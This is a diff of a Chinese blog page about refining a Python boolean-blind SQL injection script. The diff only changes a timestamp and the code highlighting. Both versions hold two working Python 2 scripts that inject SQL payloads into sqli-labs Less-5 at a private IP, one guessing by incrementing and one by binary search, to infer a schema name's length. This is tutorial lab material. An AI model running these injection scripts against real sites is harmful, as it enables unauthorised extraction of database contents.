@@ -91,7 +91,7 @@
 <meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180606/mdKF3eAHC6.png?imageslim">
 <meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180606/A3HEkh98aB.png?imageslim">
 <meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180606/CJGgj0b8ga.png?imageslim">
-<meta property="og:updated_time" content="2018-06-06T08:49:50.545Z">
+<meta property="og:updated_time" content="2018-06-06T08:53:10.108Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="python布尔盲注脚本算法完善">
 <meta name="twitter:description" content="python布尔盲注脚本算法完善完善一下上次写的python盲注工具，之前那个盲注工具在猜取字符的时候使用的二分法，通过查找0-126这个范围去采取数据库中的数据。但是当时遗留了一个问题，就是在逐个猜解数据库字符时使用二分法并没有什么问题，这时因为字符都在0-126这个固定范围内，但是在猜取数据库个数、指定数据库的表个数、字段个数或者表中记录条数时，又或者是数据库名的长度、表名长度、字段名的长度时">
@@ -368,47 +368,11 @@
 <p><img src="http://p008biu9n.bkt.clouddn.com/blog/180606/mdKF3eAHC6.png?imageslim" alt="mark"><br><strong>在这里二分算法发送了6次payload才判断出来了数据库的个数为5，可以看出当数字比较小的时候，上面的二分法的优势并没有体现出来</strong></p>
 <p><strong>那么再举一个例子，比如用盲注判断<code>information_schema</code>这个数据库名的长度，长度为18，相比之前的5大了一些，为2位数，再次对比一下两个算法</strong></p>
 <p><strong>在不确定二分法范围时采用的自增算法代码</strong></p>
-<pre><code>import requests
-url=&quot;http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1&quot;
-basehtml=requests.get(url=url).content
-i=0
-while 1:
-    payload=&quot;http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1&apos; and (select length(schema_name) from information_schema.schemata limit 0,1)=%d-- &quot;%(i)
-    html=requests.get(url=payload).content
-    print payload
-    if basehtml==html:
-        print i
-        break
-    else:
-        i=i+1
-</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180606/A3HEkh98aB.png?imageslim" alt="mark"><br><strong>发送了18次payload才判断出<code>information_schema</code>数据库名的长度为18</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line">url=<span class="string">"http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1"</span></div><div class="line">basehtml=requests.get(url=url).content</div><div class="line">i=<span class="number">0</span></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">    payload=<span class="string">"http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1' and (select length(schema_name) from information_schema.schemata limit 0,1)=%d-- "</span>%(i)</div><div class="line">    html=requests.get(url=payload).content</div><div class="line">    <span class="keyword">print</span> payload</div><div class="line">    <span class="keyword">if</span> basehtml==html:</div><div class="line">        <span class="keyword">print</span> i</div><div class="line">        <span class="keyword">break</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        i=i+<span class="number">1</span></div></pre></td></tr></table></figure>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180606/A3HEkh98aB.png?imageslim" alt="mark"><br><strong>发送了18次payload才判断出<code>information_schema</code>数据库名的长度为18</strong></p>
 <p><strong>再看一下刚刚说的二分查找算法代码</strong></p>
-<pre><code>import requests
-url=&quot;http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1&quot;
-basehtml=requests.get(url=url).content
-i=1
-s=&quot;&quot;
-while 1:
-    count=0
-    low=48
-    high=57
-    while low&lt;=high:
-        mid=(low+high)/2
-        payload=&quot;http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1&apos; AND ORD(MID((SELECT IFNULL(CAST(length(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit 0,1),%d,1))&gt;%d-- &quot;%(i,mid)
-        print payload
-        html=requests.get(url=payload).content
-        if basehtml==html:
-            low=mid+1
-            count+=1
-        else:
-            high=mid-1
-    if count!=0:
-        s=s+chr((low+high+1)/2)
-        i=i+1
-    else:
-        break
-print s
-</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180606/CJGgj0b8ga.png?imageslim" alt="mark"><br><strong>可以看到随着数字的增加，二分法的优势体现出来了，只发送了9次payload就判断出了<code>information_schema</code>数据库名的长度为18</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line">url=<span class="string">"http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1"</span></div><div class="line">basehtml=requests.get(url=url).content</div><div class="line">i=<span class="number">1</span></div><div class="line">s=<span class="string">""</span></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">    count=<span class="number">0</span></div><div class="line">    low=<span class="number">48</span></div><div class="line">    high=<span class="number">57</span></div><div class="line">    <span class="keyword">while</span> low&lt;=high:</div><div class="line">        mid=(low+high)/<span class="number">2</span></div><div class="line">        payload=<span class="string">"http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1' AND ORD(MID((SELECT IFNULL(CAST(length(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit 0,1),%d,1))&gt;%d-- "</span>%(i,mid)</div><div class="line">        <span class="keyword">print</span> payload</div><div class="line">        html=requests.get(url=payload).content</div><div class="line">        <span class="keyword">if</span> basehtml==html:</div><div class="line">            low=mid+<span class="number">1</span></div><div class="line">            count+=<span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            high=mid<span class="number">-1</span></div><div class="line">    <span class="keyword">if</span> count!=<span class="number">0</span>:</div><div class="line">        s=s+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">        i=i+<span class="number">1</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">break</span></div><div class="line"><span class="keyword">print</span> s</div></pre></td></tr></table></figure>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180606/CJGgj0b8ga.png?imageslim" alt="mark"><br><strong>可以看到随着数字的增加，二分法的优势体现出来了，只发送了9次payload就判断出了<code>information_schema</code>数据库名的长度为18</strong></p>
 
       
     </div>
